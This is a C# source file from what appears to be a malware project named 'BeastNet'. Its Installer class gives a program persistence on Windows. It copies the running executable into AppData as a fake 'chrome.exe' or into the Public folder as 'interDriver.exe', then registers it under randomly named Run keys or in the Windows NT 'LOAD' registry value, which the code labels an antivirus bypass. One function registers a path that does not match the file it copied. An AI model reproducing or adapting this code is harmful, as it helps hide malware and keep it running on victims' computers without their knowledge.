using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace BeastNet
{
    class Installer
    {
        public static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        public static void Install()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (!Application.ExecutablePath.Contains("chrome.exe"))
            {
                if (!File.Exists(Environment.GetEnvironmentVariable("public") + "\\interDriver.exe"))
                    File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable("appdata") + "\\chrome.exe");
                rk.SetValue(RandomString(7), Environment.GetEnvironmentVariable("appdata") + "\\chrome.exe");
            }
        }

        public static void InstallAVBypass()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true);
            if (!Application.ExecutablePath.Contains("interDriver.exe"))
            {
                if (!File.Exists(Environment.GetEnvironmentVariable("public") + "\\interDriver.exe"))
                    File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable("public") + "\\interDriver.exe");
                string temp;
                if (rk.GetValue("LOAD") != null)
                    temp = rk.GetValue("LOAD").ToString() + ",";
                else
                    temp = "";
                rk.SetValue("LOAD", temp + Environment.GetEnvironmentVariable("public") + "\\interDriver.exe");
            }
        }

        public static void InstallFile(string filename)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            File.Copy(filename, Environment.GetEnvironmentVariable("appdata") + "\\" + RandomString(7) + ".exe");
            rk.SetValue(RandomString(7), Environment.GetEnvironmentVariable("appdata") + "\\" + RandomString(7) + ".exe");
        }

        public static void InstallFileAVBypass(string filename)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true);
            string temp;
            if (rk.GetValue("LOAD") != null)
                temp = rk.GetValue("LOAD").ToString() + ",";
            else
                temp = "";
            rk.SetValue("LOAD", temp + filename);
        }
    }
}
